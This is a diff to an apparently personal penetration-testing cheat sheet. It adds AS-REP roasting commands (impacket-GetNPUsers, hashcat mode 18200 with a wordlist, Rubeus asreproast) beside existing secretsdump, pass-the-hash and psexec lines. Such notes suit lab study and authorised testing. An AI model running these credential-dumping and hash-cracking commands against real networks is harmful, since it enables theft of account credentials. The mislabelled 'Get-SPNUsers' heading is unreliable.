@@ -2,6 +2,7 @@
 <img width="1024" height="1024" alt="Husky hacker using blood hound" src="https://github.com/user-attachments/assets/53b44aaf-7738-4138-9e3b-4de20b368ce4" />
 
 
+
 ## Credfiles
 Could be in the xxamp folder, dump SAM, a sql data base, look for everything!
 ```
@@ -27,6 +28,13 @@ impacket-secretsdump -sam sam -system system LOCAL
 Dumping with hashes after using mkmikatz:
 ```
 impacket-secretsdump WORKGROUP/Administrator@$target -hashes sha1:ntlm
+```
+### Get-SPNUsers
+
+```
+impacket-GetNPUsers -dc-ip $target  -request -outputfile hashes.asreproast corp.com/user
+hashcat --help | grep -i "Kerberos"
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
 ```
 
 ## Mimikatz:
@@ -123,6 +131,7 @@ psexec.py corp.local/svc_sql:Summer2024!@TARGET_IP
 ### AS-REP Roasting
 ```
 Rubeus.exe asreproast
+.\Rubeus.exe asreproast /nowrap
 ```
 Or:
 ```
